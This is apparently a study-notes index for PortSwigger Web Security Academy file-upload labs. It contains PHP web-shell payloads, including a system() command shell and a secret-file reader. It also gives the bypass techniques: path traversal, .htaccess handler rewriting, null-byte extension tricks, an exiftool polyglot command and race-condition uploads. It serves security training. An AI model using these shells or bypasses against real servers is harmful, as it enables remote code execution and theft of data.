# [File upload vulnerabilities](https://portswigger.net/web-security/file-upload)

## Lab

- apprentice:
  - [1. Remote code execution via web shell upload](./lab/1.%20Remote%20code%20execution%20via%20web%20shell%20upload.md)
  - [2. Web shell upload via Content-Type restriction bypass](./lab/2.%20Web%20shell%20upload%20via%20Content-Type%20restriction%20bypass.md)
- practitioner:
  - [3. Web shell upload via path traversal](./lab/3.%20Web%20shell%20upload%20via%20path%20traversal.md)
  - [4. Web shell upload via extension blacklist bypass](./lab/4.%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass.md)
  - [5. Web shell upload via obfuscated file extension](./lab/5.%20Web%20shell%20upload%20via%20obfuscated%20file%20extension.md)
  - [6. Remote code execution via polyglot web shell up](./lab/6.%20Remote%20code%20execution%20via%20polyglot%20web%20shell%20up.md)
- expert:
  - [7. Web shell upload via race condition](./lab/7.%20Web%20shell%20upload%20via%20race%20condition.md)

## PHP shellcode

```php
<?php echo system($_GET['command']); ?>
```

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

## Exploit

1. directly upload shellcode:
    - [lab](./lab/1.%20Remote%20code%20execution%20via%20web%20shell%20upload.md)
2. change MIME type at Content-Type header to a valid type:
    - [lab](./lab/2.%20Web%20shell%20upload%20via%20Content-Type%20restriction%20bypass.md)
3. if the shellcode upload is successful but when accessing the shellcode, the server does not execute the code, try `path traversal` to upload the shellcode to another directory.
    - ../shellcode.php
    - obfuscation: ..%2fshellcode.php
    - [lab](./lab/3.%20Web%20shell%20upload%20via%20path%20traversal.md)
4. if we encounter blacklist obstacles, try some uncommon extension:
    - html5, php7, htaccess, ...
    - if we can upload a htaccess file, edit the content like this:

    ```htaccess
    AddHandler application/x-httpd-php .html
    ```

    - then try upload shellcode with html extension
    - [lab](./lab/4.%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass.md)
5. obfuscate: shellcode.php%00.jpg
    - [lab](./lab/5.%20Web%20shell%20upload%20via%20obfuscated%20file%20extension.md)
6. polygot web shell:

    ```bash
    exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
    ```

    - [lab](./lab/6.%20Remote%20code%20execution%20via%20polyglot%20web%20shell%20up.md)
7. race condition
    - start intruder attack with request to expected location of shellcode
    - upload shellcode
    - check if any response with status code 200

    - [lab](./lab/7.%20Web%20shell%20upload%20via%20race%20condition.md)
